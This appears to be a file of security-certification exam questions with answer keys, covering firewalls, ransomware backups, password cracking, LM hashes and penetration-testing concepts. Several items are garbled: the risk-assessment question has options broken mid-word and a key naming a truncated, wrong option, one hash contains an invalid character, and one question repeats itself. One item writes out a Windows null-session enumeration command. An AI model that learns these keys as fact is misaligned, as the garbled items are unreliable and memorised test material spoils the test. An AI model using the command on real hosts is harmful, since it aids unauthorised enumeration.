"A regional bank hires your company to perform a security assessment on their network after a recent data breach. The attacker was able to steal financial data from the bank by compromising only a single server. Based on this information, what should be one of your key recommendations to the bank?\nA. Place a front-end web server in a demilitarized zone that only handles external web traffic\nB. Require all employees to change their anti-virus program with a new one\nC. Move the financial data to another server on the same IP subnet\nD. Issue new certificates to the web servers from the root certificate authority\n","Answer: A — A. Place a front-end web server in a demilitarized zone that only handles external web traffic"
"Which of the following is the best countermeasure to encrypting ransomwares?\nA. Use multiple antivirus softwares\nB. Pay a ransom\nC. Keep some generation of off-line backup\nD. Analyze the ransomware to get decryption key of encrypted data\n","Answer: C — C. Keep some generation of off-line backup"
"What does a firewall check to prevent particular ports and applications from getting packets into an organization?\nA. Transport layer port numbers and application layer headers\nB. Presentation layer headers and the session layer port numbers\nC. Network layer headers and the session layer port numbers\nD. Application layer port numbers and the transport layer headers\n","Answer: A — A. Transport layer port numbers and application layer headers"
"During the process of encryption and decryption, what keys are shared? During the process of encryption and decryption, what keys are shared?\nA. Private keys\nB. User passwords\nC. Public keys\nD. Public and private keys\n","Answer: C — C. Public keys"
"Which of the following is a command line packet analyzer similar to GUI-based Wireshark?\nA. nessus\nB. tcpdump\nC. ethereal\nD. jack the ripper\n","Answer: B — B. tcpdump"
"While using your bank’s online servicing you notice the following string in the URL bar: “http: // www. MyPersonalBank. com/ account?id=368940911028389&Damount=10980&Camount=21” You observe that if you modify the Damount & Camount values and submit the request, that data on the web page reflects the changes. Which type of vulnerability is present on this site?\nA. Cookie Tampering\nB. SQL Injection\nC. Web Parameter Tampering\nD. XSS Reflection\n","Answer: C — C. Web Parameter Tampering"
"Which method of password cracking takes the most time and effort?\nA. Dictionary attack\nB. Shoulder surfing\nC. Rainbow tables\nD. Brute force\n","Answer: D — D. Brute force"
"Which of the following LM hashes represent a password of less than 8 characters? (Choose two.)\nA. BA810DBA98995F1817306D272A9441BB\nB. 44EFCE164AB921CQAAD3B435B51404EE\nC. 0182BD0BD4444BF836077A718CCDF409\nD. CEC52EB9C8E3455DC2265B23734E0DAC\nE. B757BF5C0D87772FAAD3B435B51404EE\nF. E52CAC67419A9A224A3B108F3FA6CB6D\n","Answer: BE — B. 44EFCE164AB921CQAAD3B435B51404EE; E. B757BF5C0D87772FAAD3B435B51404EE"
"A user on your Windows 2000 network has discovered that he can use L0phtcrack to sniff the SMB exchanges which carry user logons. The user is plugged into a hub with 23 other systems. However, he is unable to capture any logons though he knows that other users are logging in. What do you think is the most likely reason behind this?\nA. There is a NIDS present on that segment.\nB. Kerberos is preventing it.\nC. Windows logons cannot be sniffed.\nD. L0phtcrack only sniffs logons to web servers.\n","Answer: B — B. Kerberos is preventing it."
"Yancey is a network security administrator for a large electric company. This company provides power for over 100, 000 people in Las Vegas. Yancey has worked for his company for over 15 years and has become very successful. One day, Yancey comes in to work and finds out that the company will be downsizing and he will be out of a job in two weeks. Yancey is very angry and decides to place logic bombs, viruses, Trojans, and backdoors all over the network to take down the company once he has left. Yancey does not care if his actions land him in jail for 30 or more years, he just wants the company to pay for what they are doing to him. What would Yancey be considered?\nA. Yancey would be considered a Suicide Hacker\nB. Since he does not care about going to jail, he would be considered a Black Hat\nC. Because Yancey works for the company currently; he would be a White Hat\nD. Yancey is a Hacktivist Hacker since he is standing up to a company that is downsizing\n","Answer: A — A. Yancey would be considered a Suicide Hacker"
"Which of the following steps for risk assessment methodology refers to vulnerability identification?\nA. Determines if any flaws exist in systems, policies, or procedures\nB. Assigns values to risk probabilities; Impact values.\nC. Determines risk probability that vulnerability will be exploited (Hig\nD. Medium, Low)\nE. Identifies sources of harm to an IT syste\nF. (Natural, Huma\nG. Environmental)\n","Answer: C — C. Determines risk probability that vulnerability will be exploited (Hig"
"The tools which receive event logs from servers, network equipment, and applications, and perform analysis and correlation on those logs, and can generate alarms for security relevant issues, are known as what?\nA. network Sniffer\nB. Vulnerability Scanner\nC. Intrusion prevention Server\nD. Security incident and event Monitoring\n","Answer: D — D. Security incident and event Monitoring"
"What is the following command used for? net use \targetipc$ """" /u:""""\nA. Grabbing the etc/passwd file\nB. Grabbing the SAM\nC. Connecting to a Linux computer through Samba.\nD. This command is used to connect as a null session\nE. Enumeration of Cisco routers\n","Answer: D — D. This command is used to connect as a null session"
"John the Ripper is a technical assessment tool used to test the weakness of which of the following?\nA. Passwords\nB. File permissions\nC. Firewall rulesets\nD. Usernames\n","Answer: A — A. Passwords"
"During a black-box pen test you attempt to pass IRC traffic over port 80/TCP from a compromised web enabled host. The traffic gets blocked; however, outbound HTTP traffic is unimpeded. What type of firewall is inspecting outbound traffic?\nA. Circuit\nB. Stateful\nC. Application\nD. Packet Filtering\n","Answer: B — B. Stateful"
"What term describes the amount of risk that remains after the vulnerabilities are classified and the countermeasures have been deployed?\nA. Residual risk\nB. Impact risk\nC. Deferred risk\nD. Inherent risk\n","Answer: A — A. Residual risk"
"Why is a penetration test considered to be more thorough than vulnerability scan?\nA. Vulnerability scans only do host discovery and port scanning by default.\nB. A penetration test actively exploits vulnerabilities in the targeted infrastructure, while a vulnerability scan does not typically involve active exploitation.\nC. It is not – a penetration test is often performed by an automated tool, while a vulnerability scan requires active engagement.\nD. The tools used by penetration testers tend to have much more comprehensive vulnerability databases.\n","Answer: B — B. A penetration test actively exploits vulnerabilities in the targeted infrastructure, while a vulnerability scan does not typically involve active exploitation."
